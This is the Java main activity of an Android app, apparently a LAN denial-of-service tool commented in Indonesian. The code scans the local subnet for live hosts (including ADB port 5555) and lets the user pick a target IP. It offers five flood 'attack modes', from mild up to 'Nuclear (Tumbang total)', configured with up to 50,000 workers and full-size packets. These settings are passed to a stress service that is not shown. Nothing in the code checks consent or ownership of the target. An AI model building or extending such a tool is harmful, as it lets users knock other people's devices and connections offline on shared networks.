package com.netstress.app;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;

import rikka.shizuku.Shizuku;

public class MainActivity extends AppCompatActivity {

    private static final int SHIZUKU_CODE = 1001;
    private static final int NOTIF_CODE = 1002;
    
    private Button btnShizuku, btnStart, btnStop, btnScan;
    private EditText etTargetIp;
    private TextView tvStatus;
    private Spinner spinnerIps, spinnerMode;
    private boolean hasShizukuPermission = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Minta izin notifikasi Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, NOTIF_CODE);
            }
        }

        btnShizuku = findViewById(R.id.btnShizuku);
        btnStart = findViewById(R.id.btnStart);
        btnStop = findViewById(R.id.btnStop);
        btnScan = findViewById(R.id.btnScan);
        etTargetIp = findViewById(R.id.etTargetIp);
        tvStatus = findViewById(R.id.tvStatus);
        spinnerIps = findViewById(R.id.spinnerIps);
        spinnerMode = findViewById(R.id.spinnerMode);

        // --- SETUP SPINNER MODE SERANGAN ---
        String[] modes = {
            "1. Santai (Aman)",
            "2. Sedang (Ping naik)",
            "3. Ganas (Lag parah)",
            "4. Brutal (Koneksi putus-nyambung)",
            "5. Nuclear (Tumbang total)"
        };
        ArrayAdapter<String> modeAdapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, modes);
        modeAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        spinnerMode.setAdapter(modeAdapter);
        spinnerMode.setSelection(2); // Default "Ganas"

        // --- SETUP SHIZUKU ---
        btnShizuku.setOnClickListener(v -> {
            if (!Shizuku.pingBinder()) {
                Toast.makeText(this, "Shizuku mati! Buka app Shizuku dulu.", Toast.LENGTH_LONG).show();
                return;
            }
            if (Shizuku.checkSelfPermission() != PackageManager.PERMISSION_GRANTED) {
                Shizuku.requestPermission(SHIZUKU_CODE);
            } else {
                activateFeature();
            }
        });

        Shizuku.addRequestPermissionResultListener((requestCode, grantResult) -> {
            if (requestCode == SHIZUKU_CODE && grantResult == PackageManager.PERMISSION_GRANTED) {
                activateFeature();
            }
        });

        // --- FITUR SCAN JARINGAN (TCP SCAN) ---
        btnScan.setOnClickListener(v -> {
            if (!hasShizukuPermission) {
                Toast.makeText(this, "Aktifkan Shizuku dulu!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            tvStatus.setText("SCANNING NETWORK...");
            tvStatus.setTextColor(0xFFFFFF00); // Kuning
            btnScan.setEnabled(false);

            new Thread(() -> {
                List<String> ips = scanNetwork();
                
                runOnUiThread(() -> {
                    btnScan.setEnabled(true);
                    tvStatus.setText("SYSTEM READY");
                    tvStatus.setTextColor(0xFF00FFCC); // Cyan

                    if (ips.isEmpty()) {
                        Toast.makeText(this, "Tidak ada perangkat ditemukan. Coba lagi.", Toast.LENGTH_SHORT).show();
                    } else {
                        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, ips);
                        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
                        spinnerIps.setAdapter(adapter);
                        Toast.makeText(this, ips.size() + " perangkat ditemukan!", Toast.LENGTH_SHORT).show();
                    }
                });
            }).start();
        });

        // --- TOMBOL MULAI STRIKE ---
        btnStart.setOnClickListener(v -> {
            String ip = "";
            if (spinnerIps.getSelectedItem() != null) {
                String selected = spinnerIps.getSelectedItem().toString();
                ip = selected.split(" ")[0]; 
            } else {
                ip = etTargetIp.getText().toString().trim();
            }

            if (ip.isEmpty()) {
                Toast.makeText(this, "Pilih atau masukkan IP target!", Toast.LENGTH_SHORT).show();
                return;
            }
            if (!hasShizukuPermission) {
                Toast.makeText(this, "Klik 'Aktifkan Fitur' dulu!", Toast.LENGTH_SHORT).show();
                return;
            }

            // Ambil mode serangan
            int modePosition = spinnerMode.getSelectedItemPosition();
            int workers = 10000, payload = 1024;
            
            if (modePosition == 0) { workers = 1000; payload = 128; }
            else if (modePosition == 1) { workers = 5000; payload = 512; }
            else if (modePosition == 2) { workers = 10000; payload = 1024; }
            else if (modePosition == 3) { workers = 20000; payload = 1472; }
            else if (modePosition == 4) { workers = 50000; payload = 1472; }

            Intent intent = new Intent(this, StressService.class);
            intent.putExtra("TARGET_IP", ip);
            intent.putExtra("WORKERS", workers);
            intent.putExtra("PAYLOAD", payload);
            
            ContextCompat.startForegroundService(this, intent);
            
            tvStatus.setText("STRIKING " + ip);
            tvStatus.setTextColor(0xFF00FFCC);
            btnStart.setEnabled(false);
            btnStop.setEnabled(true);
        });

        // --- TOMBOL STOP ---
        btnStop.setOnClickListener(v -> {
            stopService(new Intent(this, StressService.class));
            tvStatus.setText("SYSTEM READY");
            tvStatus.setTextColor(0xFF33FF33);
            btnStart.setEnabled(true);
            btnStop.setEnabled(false);
        });
    }

    private void activateFeature() {
        hasShizukuPermission = true;
        btnShizuku.setText("FITUR AKTIF ✓");
        btnShizuku.setBackgroundTintList(android.content.res.ColorStateList.valueOf(0xFF33FF33));
        Toast.makeText(this, "Akses Shizuku Diberikan!", Toast.LENGTH_SHORT).show();
    }

    // --- LOGIKA SCAN JARINGAN (TCP CONNECT SCAN) ---
    private List<String> scanNetwork() {
        List<String> ipList = new ArrayList<>();
        List<String> activeIps = new ArrayList<>();
        
        // 1. Dapetin IP Address HP lo sendiri buat nentuin subnet (misal 192.168.1)
        String baseIp = getBaseIp();

        // 2. Lakuin TCP Connect Scan paralel ke 254 IP
        List<Thread> threads = new ArrayList<>();
        for (int i = 1; i < 255; i++) {
            final String targetIp = baseIp + "." + i;
            Thread t = new Thread(() -> {
                // Cek port 80 (HTTP), 443 (HTTPS), 5555 (ADB), atau 8080
                if (isPortOpen(targetIp, 80) || isPortOpen(targetIp, 443) || isPortOpen(targetIp, 5555) || isPortOpen(targetIp, 8080)) {
                    synchronized (activeIps) {
                        activeIps.add(targetIp);
                    }
                }
            });
            threads.add(t);
            t.start();
        }

        // Tunggu semua thread selesai (maksimal 1 detik)
        for (Thread t : threads) {
            try {
                t.join(1000);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        // 3. Rapihin hasil
        for (String ip : activeIps) {
            ipList.add(ip); 
        }

        return ipList;
    }

    private String getBaseIp() {
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface ni = interfaces.nextElement();
                Enumeration<InetAddress> addrs = ni.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    InetAddress addr = addrs.nextElement();
                    if (!addr.isLoopbackAddress() && addr instanceof Inet4Address) {
                        String ip = addr.getHostAddress();
                        if (ip.startsWith("192.168.") || ip.startsWith("10.")) {
                            String[] parts = ip.split("\\.");
                            return parts[0] + "." + parts[1] + "." + parts[2];
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "192.168.1"; // Fallback
    }

    private boolean isPortOpen(String ip, int port) {
        try {
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(ip, port), 200); // Timeout 200ms
            socket.close();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == SHIZUKU_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                activateFeature();
            }
        }
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }
}
